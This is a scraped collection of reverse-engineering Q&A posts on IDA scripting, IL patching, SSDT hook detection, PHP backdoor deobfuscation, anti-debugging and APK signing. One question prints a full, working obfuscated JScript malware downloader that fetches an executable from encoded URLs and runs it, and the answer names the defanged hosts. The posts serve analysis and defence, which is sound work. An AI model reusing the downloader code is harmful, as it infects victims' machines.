<p>EDIT: These errors were given by ilasm when i try to reassemble the .il file. I also tried to edit the code in Reflector but after editing and trying to save it says that it cannot save mixed mode assemblies. Maybe i would be able to edit the binary in HEX editor?</p>
","<p>Depending how extensive your modifications are, the way I've always done it was to only compile the snippet you want to inject (or manually convert the OpCodes) and patch the existing binary rather than recompile</p>

<p>also, IlSpy may be easier for what you want as you can simply go:</p>

<p>.net binary > c# decompiled > .net binary</p>

<p><a href=""http://ilspy.net"" rel=""nofollow"">http://ilspy.net</a></p>
","6030"
"IDA scripting - get local variable by its name","691","","<p>During the debugging I can see all the function's local variables in tab <strong>Locals</strong> (Debugger -> Debugger Windows -> Locals(HEXRAYS)). For example I have a struct variable </p>

<pre><code>a1    0x891E1160:{pBuf=0x7FC52F20,size=0x100}
</code></pre>

<p>I would like to write a python script to dump such data into a file. The only thing I cannot understand is how to get value of local variable by it's name. It should be something like </p>

<pre><code>fdump = open(filename, 'wb')
ptr = get_var('a1')['pBuf']
size = get_var('a1')['size']
buf = idc.GetManyBytes(ptr, size, True)
fdump.write(buf)
fdump.close()
</code></pre>

<p>Is there a function like <code>get_var</code> in idautils, idc, or idaapi?</p>
","<p>This is not full solution, but probably will help (assuming that you have IDA 6.6+ version)</p>

<pre><code># Display user-defined local variable information
# First defined the visitor class
class dump_lvar_info_t(idaapi.user_lvar_visitor_t):

    def __init__(self):
        idaapi.user_lvar_visitor_t.__init__(self)
        self.displayed_header = False
        return

    def get_info_qty_for_saving(self):
        return 0

    def get_info_for_saving(self, lv):
        return False

    def handle_retrieved_info(self, lv):

        try:
            if not self.displayed_header:
                self.displayed_header = True;
                print ""------- User defined local variable information""

            print ""Lvar defined at %x"" % (lv.ll.defea, )

            if len(str(lv.name)):
                print ""  Name: %s"" % (str(lv.name), )

            if len(str(lv.type)):
                #~ print_type_to_one_line(buf, sizeof(buf), idati, .c_str());
                print ""  Type: %s"" % (str(lv.type), )

            if len(str(lv.cmt)):
                print ""  Comment: %s"" % (str(lv.cmt), )
        except:
            traceback.print_exc()
        return 0

    def handle_retrieved_mapping(self, lm):
        return 0

    def get_info_mapping_for_saving(self):
        return None

# Now iterate over all user definitions
dli = dump_lvar_info_t();
idaapi.restore_user_lvar_settings(entry_ea, dli)
</code></pre>

<p>I don't remember where exactly this code originates from, probably from IDAPython sources on google code. Here you have iteration over variables, all the rest should be doable.</p>
","11185"
"RANSOMWARE SCRIPT decryption","689","","<p>I have a friend with PC which is infected with some sort of ""RANSOMWARE"" - a type of malware where will encrypt your files(images,videos and documents) and ask for payment for decryption.</p>

<p>I managed to take out the root processes of the virus(which encrypt and change all of document, images and video files to ""*.micro"" files) but recovering the infected data is a bit difficult and not much resources available online yet.</p>

<p>Here is the .js script file that triggers the malware:</p>

<pre><code>var _base64Idx = [
/*43 -43 = 0*/
/*'+',  1,  2,  3,'/' */
62, -1, -1, -1, 63,

/*'0','1','2','3','4','5','6','7','8','9' */
52, 53, 54, 55, 56, 57, 58, 59, 60, 61,

/*15, 16, 17,'=', 19, 20, 21 */
-1, -1, -1, 64, -1, -1, -1,

/*65 - 43 = 22*/
/*'A','B','C','D','E','F','G','H','I','J','K','L','M', */
0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12,

/*'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' */
13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,

/*91 - 43 = 48 */
/*48, 49, 50, 51, 52, 53 */
-1, -1, -1, -1, -1, -1,

/*97 - 43 = 54*/
/*'a','b','c','d','e','f','g','h','i','j','k','l','m' */
26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38,

/*'n','o','p','q','r','s','t','u','v','w','x','y','z' */
39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
];

function decode(input, output, offset) {
var out = output;
if(!out) {
    out = new Uint8Array(Math.ceil(input.length / 4) * 3);
}

// remove all non-base64 characters
input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

offset = offset || 0;
var enc1, enc2, enc3, enc4;
var i = 0, j = offset;

while(i &lt; input.length) {
    enc1 = _base64Idx[input.charCodeAt(i++) - 43];
    enc2 = _base64Idx[input.charCodeAt(i++) - 43];
    enc3 = _base64Idx[input.charCodeAt(i++) - 43];
    enc4 = _base64Idx[input.charCodeAt(i++) - 43];

    out[j++] = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4);
    if(enc3 !== 64) {
        // decoded at least 2 bytes
        out[j++] = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2);
        if(enc4 !== 64) {
            // decoded 3 bytes
            out[j++] = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;
        }
    }
}

// make sure result is the exact decoded length
return output ?
    (j - offset) :
    out.subarray(0, j);
}

var tEuosqyTkm = function (packedText) {

var buffer = [];
var length = decode(packedText, buffer);
var charCodeAt = ""charCodeAt"";
var result = """";
for (var i = 0; i &lt; length; i++) {
    result += String.fromCharCode(buffer[i] ^ ""bVE6YUkX3beIQAEG""[charCodeAt](i % ""bVE6YUkX3beIQAEG"".length));
}
return result;
};
var aideN66 = function() {
var vapidAuw = function() {};
vapidAuw.prototype.create = function(disapprobationQvY) {
    return WScript.CreateObject(disapprobationQvY);
};
return vapidAuw;
}();

(function() {
var nettlepkm = new aideN66();
var banterKA3 = 200;
var inspireRpB = tEuosqyTkm('""JRMR""');
var pallidK2I = tEuosqyTkm('""Jy4gVQ==""');
var sultryiRC = tEuosqyTkm('""NQUmRDAlH3ZgCgAlPQ==""');
var constrainedfQW = tEuosqyTkm('""LwUdexVnRQB+Li0dBRE=""');
var interpolatevY1 = tEuosqyTkm('""BDx8AAg0ABdDMA==""');
var denouementpK3 = tEuosqyTkm('""KgcBcCwRER56Jw==""');
var gratisE9J = tEuosqyTkm('""CG4EQWAYCg90Lg==""');
var rangeuR2 = tEuosqyTkm('""Jz0LeGwnBWwFIw==""');
var broochIQm = tEuosqyTkm('""MzoheDZsKhddBQ==""');
var smatteringBY6 = tEuosqyTkm('""NhQQXwwiOABAVA==""');
var interminablecBc = tEuosqyTkm('""MzwOBioiPyJwLQ==""');
var sonorousmpK = tEuosqyTkm('""IxIKchs=""');
var evidentzgN = tEuosqyTkm('""MSI3Uzg4""');
var convalesceWKQ = tEuosqyTkm('""RwIAewlwNw==""');
var justifyaTv = tEuosqyTkm('""TDM9Uw==""');
var cedeWsU = Math.pow(2, 10) * 249;
var foilgEV = [ tEuosqyTkm('""CiIxRmN6RDBWDgkmKC4wKQU7JFgoJEU7XA9Ke2dvID8H""'), tEuosqyTkm('""CiIxRmN6RDBWDgkmKC4wKQU7JFg/M0U7XA9Ke2dvID8H""') ];
var suavityzSi = 2097152;
var flagHQx = nettlepkm.create(sultryiRC);
var endemicfVU = nettlepkm.create(constrainedfQW);
var evidentv5F = nettlepkm.create(sonorousmpK + tEuosqyTkm('""TA==""') + evidentzgN);
var humbleM87 = flagHQx.ExpandEnvironmentStrings(convalesceWKQ);
var weltPvA = humbleM87 + suavityzSi + justifyaTv;
var roseatef1b = false;
for (var masticatehJi = 0; masticatehJi &lt; foilgEV.length; masticatehJi++) {
    try {
        var invocationIOk = foilgEV[masticatehJi];
        endemicfVU.open(inspireRpB, invocationIOk, false);
        endemicfVU.send();
        if (endemicfVU.status == banterKA3) {
            try {
                evidentv5F.open();
                evidentv5F.type = 1;
                evidentv5F.write(endemicfVU[tEuosqyTkm('""EDM2RjY7GD1xDQEw""')]);
                if (evidentv5F.size &gt; cedeWsU) {
                    masticatehJi = foilgEV.length;
                    evidentv5F.position = 0;
                    evidentv5F.saveToFile(weltPvA, 2);
                    roseatef1b = true;
                }
            } finally {
                evidentv5F.close();
            }
        }
    } catch (ignored) {}
}
if (roseatef1b) {
    flagHQx[pallidK2I](humbleM87 + Math.pow(2, 21));
}
})();
</code></pre>

<p>Anybody here can help me out on reverse engineering this script to decrypt/recover the encrypted files?</p>

<p>Thank you :)</p>

<p>P.S. FYI, this ""ransomware"" script circulating through emails as attachment since 9th of Feb 2016.</p>
","<p>This is just a simple downloader script.</p>

<p>it will download and run an executable from </p>

<p>hxxp://helloyoungmanff.com/26.exe (link does not works)</p>

<p>hxxp://helloyoungmanqq.com/26.exe (link works)</p>

<p><a href=""https://www.virustotal.com/en/file/d567d414aa263c2e55e9869f1a7a361e4d1b684ecf4b189015c605525645d0f4/analysis/1455187915/"" rel=""nofollow"">VT URL</a></p>
","11996"
"How does Kernel Detective check if API functions are hooked?","687","","<p>One of the many features of Kernel Detective is the possibility to retrieve the original addresses of the native apis functions implemented in the driver win32k.sys and checking if they are hooked. What are the possible ways to achieve the same ? </p>
","<p>For conventional inline hooks (that just replace the first few bytes of the function), you can simply read the first few bytes of each function to check if it is hooked. Deeper inline hooks will be difficult to detect.</p>

<p>Apart from inline hooks, someone may also hook the SSDT. The SSDT is a table that sits between syscalls from WINAPI's and the kernelmode functions that implement them. The SSDT is indexed by syscall ID and maps each ID to the address of the kernelmode function. This mapping <a href=""http://j00ru.vexillium.org/ntapi/"" rel=""nofollow noreferrer"">remains static</a> for any given service pack for a Windows OS. So it is very easy to figure out what function each syscall ID corresponds to, and thus what function each entry in the SSDT should correspond to.</p>

<p>To detect SSDT hooks and restore original addresses, you could try any of the following:</p>

<p>You could load your program/driver once before the SSDT is hooked, and grab the original addresses. This would be fairly reliable, as long as you load your driver before the hook is in place.</p>

<p>Alternatively, you could download the .pdb file from Microsoft's symbol store and get the original addresses from it using the DIA SDK or DbgHelp API's. This is very reliable as long as a connection is present and nothing is interfering with it. However, this would be quite slow for a .pdb as big as the one for ntoskrnl or win32k.</p>

<p>There are actually two SSDT's, a regular SSDT and a Shadow SSDT. If only the first SSDT is hooked, you could check the values with those in the Shadow SSDT. Or vice versa.</p>

<p>You can check if any entries in the SSDT point to addresses outside the kernel/win32k. This is a very reliable way of detecting the hooks, but it won't easily get you the original address.</p>

<p>Scanning for a byte signature is a somewhat reliable and stealthy way you could locate the original addresses.</p>

<p>There's also a similar question <a href=""https://reverseengineering.stackexchange.com/questions/1461/is-there-an-easy-way-to-detect-if-the-ssdt-has-been-patched-from-a-memory-dump"">here</a></p>
","3884"
"How can I decode this php code?","684","","<p>I found this backdoor on a client's website. </p>

<p><a href=""http://pastebin.com/wVs8w44v"">http://pastebin.com/wVs8w44v</a> (original format)</p>

<p><a href=""http://pastebin.com/acfx49QJ"">http://pastebin.com/acfx49QJ</a> (semi - readable)</p>

<p>I have gotten rid of it and realise it's an obfuscated script but how can I deobfuscate it in order to get to the root of this matter and understand the motive behind this attack better?</p>

<p>Thanks!</p>
","<p>I wrote a small Python script to deobfuscate the majority of the string obfuscation:</p>

<pre><code>import urllib
import re

php = urllib.urlopen(""http://pastebin.com/raw.php?i=wVs8w44v"").read()

# Slight modification below so that we don't escape $
z26 = ""jmiO@sxhFnD&gt;J\r/u+RcHz3}g\nd{^8 ?eVwl_T\\\t|N5q)LobU]40!p%,rC-97k&lt;'y=W:P$1BI&amp;S6\""E(K`Y~.Q;f[v2a#X*ZAGtM""

# Decode all $z26[...] strings
for i in range(len(z26)):
    php = php.replace(""$z26["" + str(i) + ""]"", ""\"""" + z26[i] + ""\"""")

# Concatenate decoded strings
php = php.replace(""\"".\"""", """")

# Replace all $GLOBALS[...]
globals = {}
for m in re.finditer(""\$GLOBALS\['(?P&lt;key&gt;\w+?)'\] = \""(?P&lt;value&gt;.*?)\"";"", php):
    globals[m.group(""key"")] = m.group(""value"")
php = re.sub("" \$GLOBALS\['(?P&lt;key&gt;\w+?)'\] = \""(?P&lt;value&gt;.*?)\"";"", """", php)
for key in globals.keys():
    php = php.replace(""$GLOBALS['"" + key + ""']"", globals[key])

print php
</code></pre>

<p>I then formatted the output with <a href=""http://phpbeautifier.com/"">http://phpbeautifier.com/</a> and stored the results at <a href=""http://pastebin.com/p7Tmvq4e"">http://pastebin.com/p7Tmvq4e</a>.</p>

<p>The only major thing left to do is to rename the functions and arguments, but that can't be easily automated. I think the content at <a href=""http://pastebin.com/p7Tmvq4e"">http://pastebin.com/p7Tmvq4e</a> should meet your needs, though!</p>
","9146"
"How does this test for debugger","684","","<p>While reading a book it mentioned that the following code is usually used to as an antidebugger </p>

<pre><code>mov     eax,   large fs:18h
mov     eax,   [eax+30h]
movzx   eax,   byte ptr [eax+2]
retn
</code></pre>

<p>I don't understand what are the keywords <code>large</code> , <code>byte</code>, <code>ptr</code> and <code>retn</code>. I am new learner of assembly and its usage in malware.</p>
","<p>The syntax is incorrect, but the code is basically what IsDebuggerPresent does.</p>

<ol>
<li>Get a pointer to the <a href=""http://en.wikipedia.org/wiki/Thread_Environment_Block"" rel=""nofollow"">TEB</a> (located at fs:18h)</li>
<li>Get a pointer to the <a href=""http://en.wikipedia.org/wiki/Process_Environment_Block"" rel=""nofollow"">PEB</a> (located at teb+30h)</li>
<li>Check the BeingDebugged flag (located at peb+2)</li>
</ol>

<p>The syntax should be something like:</p>

<pre><code>mov     eax, large fs:18h
mov     eax, [eax+30h]
movzx   eax, byte ptr [eax+2]
</code></pre>

<p>If you don't understand assembler syntax, though, you're generally going to have a bad time when analyzing malware.</p>
","6025"
"How to deal with this “lea” instructions generated by objdump?","683","","<p>So basically I am using <code>objdump</code> to disassemble a binary from `GNU Coreutils"", on 32 bit Linux x86.</p>

<p>In the disassembled code, I found one ""broken"" instruction like this:</p>

<pre><code> 804bb49:   8d 04 ed 00 00 00 00    lea    0x0(,%ebp,8),%eax
</code></pre>

<p>I asked a related question about a very similar instruction <a href=""https://reverseengineering.stackexchange.com/questions/4285/how-to-deal-with-this-error-instructions-generated-by-objdump"">here</a>, in that question, I think it should be a jump table related instruction, but how about this one ? I am quite confused..</p>

<p>Could anyone give me some help?</p>
","<p>I don't know what makes you think this instruction is ""broken"" - the fact that there is a comma right after a bracket, without a parameter in between? In this case, the disassembler just doesn't show the parameter because it's ""zero"" (more precisely, it specifies ""no register"" where ""any processor register"" would be allowed).</p>

<p>What happens here is: when addressing memory locations, the processor has a mode where it adresses </p>

<ul>
<li>a base offset</li>
<li>plus the content of one processor register</li>
<li>plus the content of another processor register, multiplied by an integer that can be 1,2,4 or 8</li>
</ul>

<p>This calculation is quite fast, as it's done in special hardware in the address bus subsystem.</p>

<p>The <code>lea</code> (load effective address) instruction is a special kind of RAM access -- it calculates the address of the operand, but then, it moves the <em>address</em>, not the data at that address, into the destination register.</p>

<p>So your 'broken' instruction moves a base offset of 0, plus ""no"" first register, plus 8 times the content of ebp, into eax. The same could have been done by moving ebp to eax and multiplying by 8, or moving and shifting left by 3 bits, but the <code>lea</code> instruction is probably a bit faster (because, as i said, it's done in specialized address bus hardware), so the compiler used that one to save a few cycles. Nothing is broken here.</p>

<p>You might want to take a look at a i386 assembler reference when disassembling, the indirect adressing is quite well explained in the <a href=""https://developer.apple.com/library/mac/documentation/DeveloperTools/Reference/Assembler/060-i386_Addressing_Modes_and_Assembler_Instructions/i386_intructions.html"" rel=""nofollow"">OS X Assembler reference</a>, scroll down to ""Indirect Memory Operands"".</p>
","4291"
"How to set a breakpoint when a method is called using LLDB on OS X?","681","","<p>I'm trying to hit a breakpoint that I set in LLDB (CLI), but for whatever reason I'm not hitting my breakpoint.  I am messing around with the stock Calculator.app on OS X, and am trying to call / hit my breakpoint when I open the About dialog box of the Calculator.app.</p>

<p>I launch the Calculator.app, then I start lldb from a Terminal window.  I find the process of the Calculator.app using ps and grep.  I attach to the running process using LLDB.  I then issue the <code>continue</code> command in LLDB to allow the Calculator.app to continue running.</p>

<p>Then I set a breakpoint in LLDB when the following method is called, <code>showAbout</code></p>

<p>I type the following command into LLDB,
<code>(lldb) breakpoint set --method showAbout</code></p>

<p>However when I click <code>About Calculator</code> from the menu bar it doesn't halt the program, but rather shows the About dialog box for the Calculator.</p>
","<p>The Calculator app is stripped as can be seen by running <code>nm</code>.
You will need to find the address of the method using <code>class-dump</code>:</p>

<pre><code>$ class-dump -A /Applications/Calculator.app | grep showAbout
- (void)showAbout:(id)arg1; // IMP=0x0000000100009939
</code></pre>

<p>However as the Calculator application is already running, the address has been slided because of ASLR.
To find the ASLR slide you can use my tool called <a href=""https://github.com/Tyilo/get_aslr"" rel=""nofollow"">get_aslr</a>, like so:</p>

<pre><code>$ sudo get_aslr $(pgrep Calculator)
ASLR slide: 0x9508000
</code></pre>

<p>You then add the two numbers together:</p>

<pre><code>0x0000000100009939 + 0x9508000 = 0x109511939
</code></pre>

<p>That is the current address of the <code>showAbout:</code> method.
Now you just need to set the breakpoint in <code>lldb</code>:</p>

<pre><code>b *0x109511939
</code></pre>

<p>And it works!</p>
","3957"
"How do I determine code coverage when fuzzing","679","","<p>Let's say I'd like to begin fuzzing Acme Corp's PDF Reader.  I'd like to try to follow what Miller <a href=""http://fuzzinginfo.files.wordpress.com/2012/05/cmiller-csw-2010.pdf"">did</a> by downloading a bunch of benign PDFs and mutate them.  </p>

<p>Miller began by reducing his corpus of PDF samples to a minimum by pruning samples that had similar code coverage.</p>

<p>How is that specific step done?  That is, how did he determine what was a similar code coverage? </p>

<p>I can imagine a tool that traces execution and records JMP/CALLs to get an execution graph, and I suppose you could diff those graphs.  But what about JIT code?  Wouldn't those graphs be very different since the JIT would likely be in different locations in memory?</p>
","<p>Not sure how it fares against application with JIT compiled code, but peach has a <a href=""http://peachfuzzer.com/v3/minset.html"">minset</a> utility to make a minimal set of files with highest code coverage:</p>

<blockquote>
  <p>This tool will run each sample file through a target program and determine code coverage. It will then find the least number of files needed to cover the most code. This will be the minimum set of files that should be used when fuzzing.</p>
</blockquote>

<p>But as far as I can see it uses the method you proposed, monitoring hits of all basic blocks of the application. It uses a pintool to do this. </p>
","1407"
"Changing .SO files in android cause to damage the apk","677","","<p>i created an android app(simple cocos2d-x project) that in this project i have  a method that takes a string and then render it, in initialize state of my app i pass the ""abcde"" as parameter to this method. This works fine in windows and android devices.
but when i open SO file that placed in apk and edit any of character of ""abcde"" string and then replace so file with older so in apk file, the apk does't install on android devices.
I get this error when trying to install the apk : application not installed.</p>

<p>anyone can explain me why this happen??</p>
","<p>Android APKs are signed to ensure the developer (holder of the private key) is the only person who can update the application. When the apk is signed, much like that of a jar file, hashes are taken of all the files.</p>

<p>What is likely happening is that you are modifying a file and not resigning the application - this will cause the package manager to reset due to hash mismatches when checking the signatures.</p>
","8278"
"How to extract information from dll compiled in gcc with debug symbols?","674","","<p>I recently read that GCC annotates the source-code into the debug symbols it produces, although I haven't found any examples on how to retrieve this. </p>

<p>If this is true, how can I view the data in the debug symbols, mainly the code annotations.</p>

<p>What would be the steps I need to complete starting with a gcc compiled dll with debug symbols.</p>
","<p>Use either <a href=""http://sourceware.org/binutils/docs/binutils/readelf.html"" rel=""nofollow"">readelf</a> utility with -w (or --debug-dump) command line switch or <a href=""https://sourceware.org/binutils/docs/binutils/nm.html"" rel=""nofollow"">nm</a> utility with -a command line switch.</p>
","3570"
"Modifying / Installing stock firmware on ISP Branded WRE2205","674","","<p>Our ISP, MWeb, gave us a free router and Wifi extender (WRE2205v2) as part of a new promotion. Neither of them really work at all (the extender works for about a minute then fails for no apparent reason). Acording to reviews, it should be a decent repeater, but it seems Mweb has completely screwed up the firmware.</p>

<p><a href=""http://simonfredsted.com/996"" rel=""nofollow"">This blog post</a> shows how to get very basic root access (it's running embedded Linux) on the device (the security is... bad). So far I've worked out it's a MIPS device (running <code>file</code> on an executable gives <code>ELF 32-bit MSB  executable, MIPS, MIPS-I version 1 (SYSV)</code> and the file system is squash-fs, so read only. I can also copy files to/from the device using tftp. </p>

<p>I also know that both the branded firmware and the stock firmware use a binary called fw_upgrade to flash a new firmware. I tried decompiling them using <a href=""http://decompiler.fit.vutbr.cz/decompilation/"" rel=""nofollow"">http://decompiler.fit.vutbr.cz/decompilation/</a> but I haven't had much luck there. The branded one has a bit more code which I assume checks something about the new firmware and prevents the stock firmware from being flashed. Finally I tried copying the stock fw_upgrade to the device and running it but it fails without an error message.</p>

<p>What else can I do to get the stock firmware running?</p>
","<p>I just got it working. Turns out I didn't need to modify the binary. After extracting the squash-fs file system from the update file, I managed to copy fw_update to the device using tftp. Running that binary (<code>/etc/fw_update upg fw.bin</code>) instead of the ISP one worked and flashed the stock firmware. The binary needs to be copied to /etc or /var because the rest is read-only.</p>
","6689"
"Why to dump precisely at OEP while manual unpacking?","674","","<p>What is the exact reason for dumping a process when the Program Counter is at OEP? I haven't found a decent answer.</p>

<p>This <a href=""https://www.corelan.be/index.php/2011/12/01/roads-iat/"" rel=""nofollow noreferrer"">Link</a> says: </p>

<blockquote>
  <p>In order to identify the IAT structure, Import Reconstructor needs to
  know the OEP of our application (of the unpacked code).</p>
</blockquote>

<p>This leaves me with the following questions:</p>

<ol>
<li>But how does knowing OEP relate to IAT?</li>
<li>When application is unpacked in memory, can't we get pointer to IAT just by walking through PE header and getting address of IT - and then of IAT?</li>
<li>Why don't we dump application not at OEP but say on <strong>jmp</strong> leading to OEP? Or one-two instructions after OEP?</li>
</ol>
","<blockquote>
  <p>But how does knowing OEP relate to IAT?</p>
</blockquote>

<p>OEP does not relate to the IAT, but is used by import reconstruction tools to find the location of IAT-like structures created by the packer.</p>

<blockquote>
  <p>When application is unpacked in memory, can't we get pointer to IAT just by walking through PE header</p>
</blockquote>

<p>This is exactly why import reconstruction is needed. Because the malware <em>intentionally</em> ruins the IAT in some way or another, only keeping a small set of mandatory functions in it, leaving the work of resolving most of the APIs as part of the unpacking code. Therefore import reconstruction will require we find the IAT by other means (because the PE defined IAT is incomplete/fake).</p>

<blockquote>
  <p>Why don't we dump application not at OEP but say on jmp leading to OEP? Or one-two instructions after OEP?</p>
</blockquote>

<p>When dumping, it is import to have executed all code related to descrambling the packed code. Otherwise, OEP might not be valid executable code. Other than that (and import reconstruction related issues) it is perfectly fine to dump and just adjust the PE's Entry Point to the OEP. Most dumping tools will allow that.</p>

<hr>

<p>Aside from answering your specific questions, here are the types of packers with regard to their IAT manipulation and what's needed to get a functional IAT in a dumped PE:</p>

<ol>
<li><p>When a packer does not change the original import table, import reconstruction is unnecessary. Most PE dumpers will copy the original import table when it's valid or dump it with the PE.</p></li>
<li><p>Some packers carry another PE that is hidden at first, and only decrypt/descramble it in it's entirety. Those packers will also carry the IAT in-tact and most dumpers will get the IAT automatically. </p></li>
<li><p>Some packers will create their own alternative IAT and implement their own version of API loading/resolving. For those packers, an import reconstruction utility will need to locate that alternative (or, shall we say real?) IAT and create a new IAT in the reconstructed PE from scratch (based on those APIs actually pointed by the original IAT). Import reconstruction will then find ranges of ""IAT looking"" offsets and make sure they reside in the same location when the PE is loaded. The OEP is therefore scanned for calls that use offset tables that might be suspected as being such an alternative IAT.</p></li>
<li><p>Some packers will not create a single IAT, but instead many small IAT tables, such that you would no longer call them ""Tables"". In those cases, the import reconstruction tool <em>must</em> encounter enough of those small tables and reconstruct each of them separately. In those cases it is even more important not to leave any piece of code still packed, as APIs only used by those pieces of code will not be reconstructed.</p></li>
<li><p>Another type of packers make it even harder to resolve APIs for static disassembly (although do not prevent execution of the dumped PE) by dropping the concept of import tables and instead resolve the API requested every time an API call is made. This is usually done by assigning a key/hash that is not trivially recognizable to any API, and walk over DLLs and Export tables every time a call is made, generating the same key/hash for APIs until the correct key is found.
This usually mean import reconstruction is not needed to execute and debug the dumped PE, but a human reverse engineer will have difficulties understanding which APIs are being called.</p></li>
</ol>
","14997"
"How to dynamically load address of USER32.DLL in shellcode?","672","","<p>Assuming I'm injecting a shellcode into a Windows GUI application, I know I could:  </p>

<ul>
<li>Gets kernel32.dll base address through the PEB (Process Environment Block);  </li>
<li>Finds address of LoadLibrary;  </li>
<li>Call LoadLibrary(""user32.dll"");  </li>
<li>Finally call GetProcAddress.</li>
</ul>

<p>This is the classic way and that's what I would do, however I'd like to know if there's a better/improved/faster/clever/different/smaller or simpler way to do this.</p>

<p>Any ideas?</p>
","<p>If <code>user32.dll</code> is already loaded in the process's address space (and I assume it is given that you said it's a Windows GUI application), you can walk the <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708.aspx"" rel=""nofollow noreferrer""><code>PEB_LDR_DATA</code></a> structure in order to find the base address of <code>user32.dll</code>:</p>

<ul>
<li><a href=""https://ringzer0.wordpress.com/2010/11/23/kernel32-image-base-address-on-windows-seven/"" rel=""nofollow noreferrer"">KERNEL32 image base address on Windows Seven</a></li>
<li><a href=""http://sandsprite.com/CodeStuff/Understanding_the_Peb_Loader_Data_List.html"" rel=""nofollow noreferrer"">Understanding the PEB Loader
Data Structure</a></li>
<li><a href=""https://reverseengineering.stackexchange.com/questions/4465/where-is-ntdll-dll"">Where is ntdll.dll?</a></li>
</ul>
","11088"
"Advice about first steps on reversing windows kernel","670","","<p>I'll appreciate if anyone can give me a couple advices regarding kernel debugging/reversing.</p>

<p>For instance if i want to know how the heap manager works what should i look for ?</p>

<p>I have no experience in reversing kernels.</p>
","<p>First and most important advice I can give you is to <strong>not</strong> debug on your host machine, use a virtual machine such as hyper-v, VMWare and virtualbox instead. </p>

<p>Second, your preferred tool is <a href=""https://msdn.microsoft.com/en-us/windows/hardware/hh852365.aspx"" rel=""nofollow"">WinDbg</a>. There are many tutorials for setting it up with virtual machines. You can start from <a href=""https://msdn.microsoft.com/en-us/library/windows/hardware/ff538143(v=vs.85).aspx"" rel=""nofollow"">MSDN</a>.</p>

<p>If you want to learn more how ""heap management works"" fast and in great details, you should consider reading the book <a href=""http://www.opening-windows.com/wmip/overview.htm"" rel=""nofollow"">What Makes It Page</a> by Enrico Martignetti. </p>
","11921"
"Dumping binary with radare2","665","","<p>I have found <a href=""https://reverseengineering.stackexchange.com/questions/8568/how-do-you-tell-radare-to-do-a-full-dump-of-an-x86-binary"">the command</a> <code>r2 -c 'pi $s'</code> to dump a binary with radare2. I have tried this redirecting the output to a file: <code>r2 -c 'pi $s' binary &gt; dump.txt</code>. The dump is created but radare2 gets unresponsive. Is this a bug, or am I doing something wrong?</p>
","<p>This is because you're not passing the <code>-q</code> flag to radare2:</p>

<pre><code>$ r2 -h | grep -- -q
-q           quiet mode (no prompt) and quit after -i
</code></pre>

<p>The <code>-c</code> flag will execute a command in radare2, and then land you in the radare shell, but since you're redirecting <code>stdout</code> to a file, you can't see this. But if you hit <code>q</code> (as in <code>q</code>uit) and <em>Enter</em>, radare2 will exit.</p>

<p>This is the command that you should use: <code>r2 -q -c 'pi $s' ./a.out &gt; out.txt</code> if you want radare2 to dump the entire binary, then exit. </p>
","11949"
"IDAPython Strings constantly returns NoneType with str()","665","","<p>I'm trying to automate  disassembly of a firmware image using IDA Pro 6.5 and IDA Python. One of the process I want to implement is to locate strings and create a data segment around them.</p>

<p>Using the GUI, I have little issue doing so. However when using the <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/idautils.Strings.StringItem-class.html"" rel=""nofollow""><code>idautils.Strings()</code></a> API call, I can retrieve a list of <code>StringItem</code> objects, but I fail to access the actual string data with <code>str()</code> or <code>unicode()</code>. Below is the failing function, which is taken from <a href=""https://code.google.com/p/idapython/source/browse/trunk/examples/ex_strings.py?r=344"" rel=""nofollow"">IDA Python Google Code archive</a>:</p>

<pre><code>def find_strings():
    s = idautils.Strings(False)
    s.setup(strtypes=Strings.STR_UNICODE | Strings.STR_C)
    for i, v in enumerate(s):
        if v is None:
            print(""Failed to retrieve string index %d"" % i)
        else:
            print(""%x: len=%d type=%d index=%d-&gt; '%s'"" % (v.ea, v.length, v.type, i, str(v)))
</code></pre>

<p>When ran into IDA, the following error is reported:</p>

<pre><code>Traceback (most recent call last):
  File ""&lt;string&gt;"", line 1, in &lt;module&gt;
  File ""&lt;string&gt;"", line 8, in find_strings
TypeError: 'StringItem' object is not callable
</code></pre>

<p>When replacing the <code>str(v)</code> argument with the constant <code>aaa</code> in the <code>print</code> function, I get a list of <code>StringItem</code> objects without any problem:</p>

<pre><code>Python&gt;find_strings()
208e: len=8 type=3 index=0-&gt; 'aaa'
21b0: len=55 type=0 index=1-&gt; 'aaa'
229d: len=6 type=0 index=2-&gt; 'aaa'
22c5: len=5 type=0 index=3-&gt; 'aaa'
22d3: len=33 type=0 index=4-&gt; 'aaa'
...
</code></pre>

<p>If I attempt to use the <code>unicode()</code> function instead, I get the following error:</p>

<pre><code>Python&gt;find_strings()
208e: len=8 type=3 index=0-&gt; '
Traceback (most recent call last):
  File ""&lt;string&gt;"", line 1, in &lt;module&gt;
  File ""&lt;string&gt;"", line 8, in find_strings
TypeError: coercing to Unicode: need string or buffer, NoneType found
</code></pre>

<p>From my understanding, it seems that the <code>StringItem</code> contains no strings for an unknown reason (or an issue with the plugin, specific version of Python maybe?), however they are displayed in the GUI.</p>

<p>I'm seeking advice on either what I'm doing wrong, or an alternative way to extract the strings using the IDApython plugin. Thanks</p>

<h2>Updates</h2>

<p>The code above appears valid after adding the missing parenthesis as mentioned in the comments. However this was only a typo in the post and not the source of the issue. The <code>find_strings</code> worked fine in other typical binaries. Further proof is that by using the <code>idc.GetString(self.ea, self.length, self.type)</code> also returned <code>NoneType</code>.</p>

<p>Diff mentioned that the <code>get_ascii_contents2</code> is failing and thus returning <code>null</code>, which is very likely the cause. What is unclear is why the function is failing, while the GUI succeeds in locating most of the strings.</p>

<p>The first string at 0x208E is a trash Unicode string. The string at 0x21B0 is an actual ASCII string composed of 37 chars. I cannot post the complete string due to disclosure/legal issues. Notice that when displayed in the hex editor, the byte order of the ASCII view is inverted for an unknown reason. The bitness of the overall firmware is 16bit.</p>

<p><code>434F 5059 5249 4748 5420 A920 ... 4544 2000 0000 : OCYPIRHG T ¬ ... DE.</code></p>

<p>Finally, note that the function <code>MakeStr</code> works without any issue. I have the following code, when used at 0x21B0, will successfully create a string within a data segment:</p>

